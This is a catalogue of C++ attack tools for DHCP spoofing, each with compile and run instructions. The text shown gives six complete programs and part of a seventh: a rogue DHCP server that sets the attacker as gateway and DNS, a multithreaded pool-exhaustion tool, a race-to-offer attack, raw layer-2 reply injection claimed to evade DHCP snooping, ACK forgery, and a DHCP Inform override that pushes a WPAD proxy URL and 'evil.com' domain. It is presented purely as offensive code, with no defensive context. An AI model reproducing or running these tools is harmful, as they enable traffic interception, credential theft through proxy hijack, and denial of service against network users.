# 20 DHCP Spoofing Techniques in C++

Each script demonstrates a distinct DHCP spoofing methodology with compile instructions.

---

### 1. Basic Rogue DHCP Server (Single Client Offer)
```cpp
// Compile: g++ -o dhcp_rogue dhcp_rogue.cpp
// Run: sudo ./dhcp_rogue <interface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class RogueDHCPServer {
private:
    int sock;
    std::string iface;
    
public:
    RogueDHCPServer(const std::string& i) : iface(i) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) { perror("socket"); exit(1); }
        
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        
        if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            perror("bind");
            exit(1);
        }
    }
    
    void sendOffer(const uint8_t* clientMAC, uint32_t xid, 
                   const std::string& clientIP, bool isAck) {
        uint8_t packet[1024];
        memset(packet, 0, sizeof(packet));
        
        // BOOTP header
        packet[0] = 2;   // Boot Reply
        packet[1] = 1;   // Ethernet
        packet[2] = 6;   // MAC length
        packet[3] = 0;   // Hops
        
        *(uint32_t*)(packet + 4) = xid;  // Transaction ID
        
        // Client IP, Your IP, Server IP, Gateway
        struct in_addr clientAddr;
        inet_pton(AF_INET, clientIP.c_str(), &clientAddr);
        *(uint32_t*)(packet + 16) = clientAddr.s_addr;  // yiaddr
        
        struct in_addr serverAddr;
        inet_pton(AF_INET, "192.168.1.254", &serverAddr);
        *(uint32_t*)(packet + 20) = serverAddr.s_addr;  // siaddr
        
        // Client MAC
        memcpy(packet + 28, clientMAC, 6);
        
        // Magic cookie
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        // DHCP Message Type
        packet[pos++] = 53;   // Option: DHCP Message Type
        packet[pos++] = 1;    // Length
        packet[pos++] = isAck ? 5 : 2;  // ACK or OFFER
        
        // Subnet mask
        packet[pos++] = 1;
        packet[pos++] = 4;
        struct in_addr maskAddr;
        inet_pton(AF_INET, "255.255.255.0", &maskAddr);
        memcpy(packet + pos, &maskAddr.s_addr, 4);
        pos += 4;
        
        // Router (Gateway) - pointing to attacker
        packet[pos++] = 3;
        packet[pos++] = 4;
        struct in_addr gwAddr;
        inet_pton(AF_INET, "192.168.1.254", &gwAddr);
        memcpy(packet + pos, &gwAddr.s_addr, 4);
        pos += 4;
        
        // DNS Server - attacker's spoofed DNS
        packet[pos++] = 6;
        packet[pos++] = 4;
        struct in_addr dnsAddr;
        inet_pton(AF_INET, "192.168.1.254", &dnsAddr);
        memcpy(packet + pos, &dnsAddr.s_addr, 4);
        pos += 4;
        
        // Lease time
        packet[pos++] = 51;
        packet[pos++] = 4;
        *(uint32_t*)(packet + pos) = htonl(86400);
        pos += 4;
        
        // Server ID
        packet[pos++] = 54;
        packet[pos++] = 4;
        memcpy(packet + pos, &serverAddr.s_addr, 4);
        pos += 4;
        
        // End
        packet[pos++] = 255;
        
        // Send to broadcast
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0, 
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] Rogue DHCP server listening on port 67\n";
        std::cout << "[*] Will offer 192.168.1.100 with attacker gateway\n";
        
        uint8_t buffer[2048];
        std::string offeredIP = "192.168.1.100";
        
        while (true) {
            struct sockaddr_in from;
            socklen_t fromLen = sizeof(from);
            
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0,
                                 (struct sockaddr*)&from, &fromLen);
            
            if (bytes < 240) continue;
            
            // Check for DHCP Discover
            if (buffer[0] == 1 && buffer[240] == 53 && buffer[242] == 1) {
                uint32_t xid = *(uint32_t*)(buffer + 4);
                uint8_t clientMAC[6];
                memcpy(clientMAC, buffer + 28, 6);
                
                char macStr[18];
                snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
                         clientMAC[0], clientMAC[1], clientMAC[2],
                         clientMAC[3], clientMAC[4], clientMAC[5]);
                
                std::cout << "[DHCP] Discover from " << macStr << "\n";
                std::cout << "[DHCP] Offering " << offeredIP << " (attacker gateway)\n";
                
                sendOffer(clientMAC, xid, offeredIP, false);
            }
        }
    }
    
    ~RogueDHCPServer() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <interface>\n";
        return 1;
    }
    srand(time(NULL));
    RogueDHCPServer server(argv[1]);
    server.run();
    return 0;
}
```

**Technique:** Listens for DHCP DISCOVER broadcasts and responds with malicious OFFER containing attacker gateway + DNS. Client routes all traffic through attacker.

---

### 2. DHCP Pool Exhaustion (Starvation)
```cpp
// Compile: g++ -o dhcp_starve dhcp_starve.cpp -lpthread
// Run: sudo ./dhcp_starve <interface> <count> <threads>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <random>
#include <ctime>
#include <unistd.h>
#include <thread>
#include <vector>
#include <atomic>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPStarvation {
private:
    std::atomic<uint32_t> counter{0};
    std::string iface;
    
    std::string randomMAC() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        char mac[18];
        snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                 dis(gen) & 0xFE, dis(gen), dis(gen), dis(gen), dis(gen), dis(gen));
        return std::string(mac);
    }
    
    void starvationThread(int count) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(68);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(67);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        for (int i = 0; i < count; i++) {
            uint8_t packet[300];
            memset(packet, 0, sizeof(packet));
            
            packet[0] = 1;   // Boot Request
            packet[1] = 1;   // Ethernet
            packet[2] = 6;   // MAC len
            packet[3] = 0;
            
            *(uint32_t*)(packet + 4) = rand();  // Random XID
            
            // Random MAC
            std::string mac = randomMAC();
            uint8_t macBytes[6];
            sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &macBytes[0], &macBytes[1], &macBytes[2],
                   &macBytes[3], &macBytes[4], &macBytes[5]);
            memcpy(packet + 28, macBytes, 6);
            
            // Magic cookie
            packet[236] = 0x63;
            packet[237] = 0x82;
            packet[238] = 0x53;
            packet[239] = 0x63;
            
            // DHCP Discover
            packet[240] = 53;
            packet[241] = 1;
            packet[242] = 1;
            
            // Client Identifier (MAC)
            packet[243] = 61;
            packet[244] = 7;
            packet[245] = 1;
            memcpy(packet + 246, macBytes, 6);
            
            // End
            packet[253] = 255;
            
            sendto(sock, packet, 254, 0,
                   (struct sockaddr*)&broadcast, sizeof(broadcast));
            
            counter++;
            
            if (i % 100 == 0) usleep(10000);
        }
        
        close(sock);
    }
    
public:
    DHCPStarvation(const std::string& i) : iface(i) {}
    
    void run(int totalCount, int numThreads) {
        std::cout << "[*] DHCP starvation: " << totalCount 
                  << " requests via " << numThreads << " threads\n";
        
        std::vector<std::thread> threads;
        int perThread = totalCount / numThreads;
        
        for (int i = 0; i < numThreads; i++) {
            threads.emplace_back(&DHCPStarvation::starvationThread, 
                                this, perThread);
        }
        
        for (auto& t : threads) t.join();
        
        std::cout << "[+] Sent " << counter.load() 
                  << " DHCP requests (pool should be exhausted)\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <interface> <count> <threads>\n";
        return 1;
    }
    srand(time(NULL));
    DHCPStarvation starve(argv[1]);
    starve.run(atoi(argv[2]), atoi(argv[3]));
    return 0;
}
```

**Technique:** Sends thousands of DHCP DISCOVER requests with unique MACs to exhaust the DHCP server's IP pool. Forces legitimate clients to fail DHCP, then rogue server takes over.

---

### 3. DHCP Race Condition (Beat Legitimate Server)
```cpp
// Compile: g++ -o dhcp_race dhcp_race.cpp -lpthread
// Run: sudo ./dhcp_race <interface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <thread>
#include <atomic>

class DHCPRace {
private:
    std::atomic<bool> running{false};
    std::string iface;
    
    // Continuously spam DHCP OFFERs to every DISCOVER seen
    void raceThread() {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
        
        uint8_t buffer[2048];
        
        while (running.load()) {
            struct timeval tv;
            tv.tv_sec = 0;
            tv.tv_usec = 50000;  // 50ms
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (bytes < 240) continue;
            
            // DHCP Discover from client
            if (buffer[0] == 1 && buffer[240] == 53 && buffer[242] == 1) {
                uint32_t xid = *(uint32_t*)(buffer + 4);
                uint8_t clientMAC[6];
                memcpy(clientMAC, buffer + 28, 6);
                
                // Send MULTIPLE offers instantly - race against real server
                for (int i = 0; i < 10; i++) {
                    sendOffer(sock, clientMAC, xid);
                }
            }
        }
        
        close(sock);
    }
    
    void sendOffer(int sock, const uint8_t* clientMAC, uint32_t xid) {
        uint8_t packet[512];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr clientIP;
        inet_pton(AF_INET, "192.168.1.100", &clientIP);
        *(uint32_t*)(packet + 16) = clientIP.s_addr;
        
        struct in_addr serverIP;
        inet_pton(AF_INET, "192.168.1.254", &serverIP);
        *(uint32_t*)(packet + 20) = serverIP.s_addr;
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 2;  // OFFER
        
        packet[pos++] = 1; packet[pos++] = 4;
        struct in_addr mask;
        inet_pton(AF_INET, "255.255.255.0", &mask);
        memcpy(packet + pos, &mask.s_addr, 4); pos += 4;
        
        packet[pos++] = 3; packet[pos++] = 4;
        struct in_addr gw;
        inet_pton(AF_INET, "192.168.1.254", &gw);
        memcpy(packet + pos, &gw.s_addr, 4); pos += 4;
        
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 51; packet[pos++] = 4;
        *(uint32_t*)(packet + pos) = htonl(3600); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
public:
    DHCPRace(const std::string& i) : iface(i) {}
    
    void run() {
        std::cout << "[*] DHCP race attack\n";
        std::cout << "[*] Sending 10 offers per Discover to win race\n";
        running = true;
        raceThread();
    }
};

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <interface>\n";
        return 1;
    }
    srand(time(NULL));
    DHCPRace race(argv[1]);
    race.run();
    return 0;
}
```

**Technique:** Sends 10 OFFER packets per DISCOVER, beating legitimate server's 1 OFFER. Wins race condition on LAN where rogue server is closer/faster.

---

### 4. DHCP Reply Injection (Fast Path)
```cpp
// Compile: g++ -o dhcp_reply dhcp_reply.cpp
// Run: sudo ./dhcp_reply <interface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <net/ethernet.h>

class DHCPReplyInjection {
private:
    int rawSock;
    std::string iface;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    DHCPReplyInjection(const std::string& i) : iface(i) {
        rawSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        if (rawSock < 0) { perror("socket"); exit(1); }
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        bind(rawSock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void injectReply(const uint8_t* clientMAC, const uint8_t* serverMAC,
                     uint32_t xid, const std::string& offeredIP) {
        uint8_t packet[512];
        memset(packet, 0, sizeof(packet));
        
        // Ethernet header
        struct ether_header* eth = (struct ether_header*)packet;
        memcpy(eth->ether_dhost, clientMAC, 6);
        memcpy(eth->ether_shost, serverMAC, 6);
        eth->ether_type = htons(ETH_P_IP);
        
        // IP header
        uint8_t* ipStart = packet + 14;
        ipStart[0] = 0x45;
        ipStart[1] = 0;
        *(uint16_t*)(ipStart + 2) = htons(328);  // Total length placeholder
        *(uint16_t*)(ipStart + 4) = 0;
        *(uint16_t*)(ipStart + 6) = 0;
        ipStart[8] = 64;
        ipStart[9] = IPPROTO_UDP;
        *(uint16_t*)(ipStart + 10) = 0;
        
        struct in_addr srcIP;
        inet_pton(AF_INET, "192.168.1.254", &srcIP);
        memcpy(ipStart + 12, &srcIP.s_addr, 4);
        
        struct in_addr dstIP;
        inet_pton(AF_INET, "255.255.255.255", &dstIP);
        memcpy(ipStart + 16, &dstIP.s_addr, 4);
        
        // UDP header
        uint8_t* udpStart = ipStart + 20;
        *(uint16_t*)(udpStart + 0) = htons(67);
        *(uint16_t*)(udpStart + 2) = htons(68);
        *(uint16_t*)(udpStart + 4) = htons(308);
        *(uint16_t*)(udpStart + 6) = 0;
        
        // BOOTP
        uint8_t* bootp = udpStart + 8;
        bootp[0] = 2;
        bootp[1] = 1;
        bootp[2] = 6;
        bootp[3] = 0;
        *(uint32_t*)(bootp + 4) = xid;
        
        struct in_addr clientAddr;
        inet_pton(AF_INET, offeredIP.c_str(), &clientAddr);
        *(uint32_t*)(bootp + 16) = clientAddr.s_addr;
        memcpy(bootp + 20, &srcIP.s_addr, 4);
        
        memcpy(bootp + 28, clientMAC, 6);
        
        bootp[236] = 0x63;
        bootp[237] = 0x82;
        bootp[238] = 0x53;
        bootp[239] = 0x63;
        
        int pos = 240;
        bootp[pos++] = 53; bootp[pos++] = 1; bootp[pos++] = 2;
        
        bootp[pos++] = 1; bootp[pos++] = 4;
        struct in_addr mask;
        inet_pton(AF_INET, "255.255.255.0", &mask);
        memcpy(bootp + pos, &mask.s_addr, 4); pos += 4;
        
        bootp[pos++] = 3; bootp[pos++] = 4;
        memcpy(bootp + pos, &srcIP.s_addr, 4); pos += 4;
        
        bootp[pos++] = 6; bootp[pos++] = 4;
        memcpy(bootp + pos, &srcIP.s_addr, 4); pos += 4;
        
        bootp[pos++] = 54; bootp[pos++] = 4;
        memcpy(bootp + pos, &srcIP.s_addr, 4); pos += 4;
        
        bootp[pos++] = 255;
        
        // Adjust lengths
        int totalLen = 14 + 20 + 8 + pos;
        *(uint16_t*)(ipStart + 2) = htons(20 + 8 + pos);
        *(uint16_t*)(udpStart + 4) = htons(8 + pos);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, clientMAC, 6);
        
        sendto(rawSock, packet, totalLen, 0,
               (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void run() {
        std::cout << "[*] DHCP reply injection - watching for Discover\n";
        
        uint8_t buffer[65536];
        uint8_t serverMAC[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
        
        while (true) {
            int bytes = recv(rawSock, buffer, sizeof(buffer), 0);
            if (bytes < 42) continue;
            
            struct ether_header* eth = (struct ether_header*)buffer;
            if (ntohs(eth->ether_type) != ETH_P_IP) continue;
            
            struct iphdr* ip = (struct iphdr*)(buffer + 14);
            if (ip->protocol != IPPROTO_UDP) continue;
            
            int ipHdrLen = ip->ihl * 4;
            struct udphdr* udp = (struct udphdr*)(buffer + 14 + ipHdrLen);
            
            if (ntohs(udp->dest) != 67) continue;
            
            uint8_t* bootp = (uint8_t*)udp + 8;
            if (bootp[0] != 1) continue;
            if (bootp[240] != 53 || bootp[242] != 1) continue;
            
            uint32_t xid = *(uint32_t*)(bootp + 4);
            uint8_t clientMAC[6];
            memcpy(clientMAC, bootp + 28, 6);
            
            std::cout << "[*] Injecting reply...\n";
            injectReply(clientMAC, serverMAC, xid, "192.168.1.100");
        }
    }
    
    ~DHCPReplyInjection() { close(rawSock); }
};

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <interface>\n";
        return 1;
    }
    DHCPReplyInjection inject(argv[1]);
    inject.run();
    return 0;
}
```

**Technique:** Raw layer-2 injection of DHCP replies. Bypasses kernel's UDP stack overhead, gets reply out faster than legitimate server. Bypasses some DHCP snooping.

---

### 5. DHCP ACK Forgery (Skip OFFER)
```cpp
// Compile: g++ -o dhcp_ack dhcp_ack.cpp
// Run: sudo ./dhcp_ack <interface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPAckForgery {
private:
    int sock;
    
public:
    DHCPAckForgery() {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void sendACK(const uint8_t* clientMAC, uint32_t xid, 
                 const std::string& clientIP) {
        uint8_t packet[512];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr addr;
        inet_pton(AF_INET, clientIP.c_str(), &addr);
        *(uint32_t*)(packet + 16) = addr.s_addr;
        
        inet_pton(AF_INET, "192.168.1.254", &addr);
        *(uint32_t*)(packet + 20) = addr.s_addr;
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        // ACK
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 5;
        
        // Subnet
        packet[pos++] = 1; packet[pos++] = 4;
        inet_pton(AF_INET, "255.255.255.0", &addr);
        memcpy(packet + pos, &addr.s_addr, 4); pos += 4;
        
        // Gateway = attacker
        packet[pos++] = 3; packet[pos++] = 4;
        inet_pton(AF_INET, "192.168.1.254", &addr);
        memcpy(packet + pos, &addr.s_addr, 4); pos += 4;
        
        // DNS = attacker
        packet[pos++] = 6; packet[pos++] = 4;
        memcpy(packet + pos, &addr.s_addr, 4); pos += 4;
        
        // Lease time
        packet[pos++] = 51; packet[pos++] = 4;
        *(uint32_t*)(packet + pos) = htonl(86400); pos += 4;
        
        // Server ID
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &addr.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] DHCP ACK forgery - skip OFFER phase\n";
        
        uint8_t buffer[2048];
        
        while (true) {
            struct sockaddr_in from;
            socklen_t fromLen = sizeof(from);
            
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0,
                                 (struct sockaddr*)&from, &fromLen);
            if (bytes < 240) continue;
            
            // Respond to Discover OR Request with ACK directly
            if (buffer[0] == 1 && buffer[240] == 53) {
                uint8_t msgType = buffer[242];
                if (msgType == 1 || msgType == 3) {
                    uint32_t xid = *(uint32_t*)(buffer + 4);
                    uint8_t clientMAC[6];
                    memcpy(clientMAC, buffer + 28, 6);
                    
                    // Extract requested IP if present
                    std::string clientIP = "192.168.1.100";
                    
                    std::cout << "[*] Sending ACK directly\n";
                    sendACK(clientMAC, xid, clientIP);
                }
            }
        }
    }
    
    ~DHCPAckForgery() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <interface>\n";
        return 1;
    }
    srand(time(NULL));
    DHCPAckForgery ack;
    ack.run();
    return 0;
}
```

**Technique:** Skips OFFER phase — sends ACK directly in response to DISCOVER. Faster than legitimate server's DISCOVER→OFFER→REQUEST→ACK flow.

---

### 6. DHCP Inform Attack (Override Configuration)
```cpp
// Compile: g++ -o dhcp_inform dhcp_inform.cpp
// Run: sudo ./dhcp_inform <interface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPInformAttack {
private:
    int sock;
    
public:
    DHCPInformAttack() {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    // Respond to DHCP Inform (client asking for config, has IP already)
    void sendInformReply(const uint8_t* clientMAC, uint32_t xid,
                         const std::string& existingIP) {
        uint8_t packet[512];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        // Don't assign IP - client already has one
        // Just send config options
        
        struct in_addr serverAddr;
        inet_pton(AF_INET, "192.168.1.254", &serverAddr);
        *(uint32_t*)(packet + 20) = serverAddr.s_addr;
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        // DHCP ACK
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 5;
        
        // Override DNS
        packet[pos++] = 6; packet[pos++] = 4;
        struct in_addr dnsAddr;
        inet_pton(AF_INET, "192.168.1.254", &dnsAddr);
        memcpy(packet + pos, &dnsAddr.s_addr, 4); pos += 4;
        
        // Override domain
        const char* domain = "evil.com";
        packet[pos++] = 15;
        packet[pos++] = strlen(domain);
        memcpy(packet + pos, domain, strlen(domain));
        pos += strlen(domain);
        
        // Override router
        packet[pos++] = 3; packet[pos++] = 4;
        memcpy(packet + pos, &dnsAddr.s_addr, 4); pos += 4;
        
        // WPAD (Web Proxy Auto-Discovery)
        const char* wpad = "http://192.168.1.254/wpad.dat";
        packet[pos++] = 252;
        packet[pos++] = strlen(wpad);
        memcpy(packet + pos, wpad, strlen(wpad));
        pos += strlen(wpad);
        
        // NTP server
        packet[pos++] = 42; packet[pos++] = 4;
        memcpy(packet + pos, &dnsAddr.s_addr, 4); pos += 4;
        
        // Server ID
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &dnsAddr.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] DHCP Inform attack - hijack config options\n";
        
        uint8_t buffer[2048];
        
        while (true) {
            struct sockaddr_in from;
            socklen_t fromLen = sizeof(from);
            
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0,
                                 (struct sockaddr*)&from, &fromLen);
            if (bytes < 240) continue;
            
            // Check for DHCP INFORM
            if (buffer[0] == 1 && buffer[240] == 53 && buffer[242] == 8) {
                uint32_t xid = *(uint32_t*)(buffer + 4);
                uint8_t clientMAC[6];
                memcpy(clientMAC, buffer + 28, 6);
                
                std::cout << "[*] DHCP Inform detected - sending config override\n";
                sendInformReply(clientMAC, xid, "");
            }
        }
    }
    
    ~DHCPInformAttack() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <interface>\n";
        return 1;
    }
    DHCPInformAttack attack;
    attack.run();
    return 0;
}
```

**Technique:** DHCP Inform attack — client already has IP, asks for extra config. Attacker sends override DNS, WPAD, domain, NTP. Redirects services without changing IP.

---

### 7. DHCP with WPAD Injection (Proxy Hijack)
```cpp
// Compile: g++ -o dhcp_wpad dhcp_wpad.cpp
// Run: sudo ./dhcp_wpad <interface> <wpad_server_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPWpadInjection {
private:
    int sock;
    std::string wpadIP;
    
public:
    DHCPWpadInjection(const std::string& ip) : wpadIP(ip) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void sendWpadOffer(const uint8_t* clientMAC, uint32_t xid) {
        uint8_t packet[512];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr clientIP;
        inet_pton(AF_INET, "192.168.1.100", &clientIP);
        *(uint32_t*)(packet + 16) = clientIP.s_addr;
        
        struct in_addr serverIP;
        inet_pton(AF_INET, wpadIP.c_str(), &serverIP);
        *(uint32_t*)(packet + 20) = serverIP.s_addr;
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 2;
        
        packet[pos++] = 1; packet[pos++] = 4;
        struct in_addr mask;
        inet_pton(AF_INET, "255.255.255.0", &mask);
        memcpy(packet + pos, &mask.s_addr, 4); pos += 4;
        
        packet[pos++] = 3; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 6; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // WPAD - MSFT's Web Proxy Auto-Discovery
        std::string wpad = "http://" + wpadIP + "/wpad.dat";
        packet[pos++] = 252;
        packet[pos++] = wpad.length();
        memcpy(packet + pos, wpad.c_str(), wpad.length());
        pos += wpad.length();
        
        // Domain name (for WPAD DNS lookup to work)
        const char* domain = "corp.local";
        packet[pos++] = 15;
        packet[pos++] = strlen(domain);
        memcpy(packet + pos, domain, strlen(domain));
        pos += strlen(domain);
        
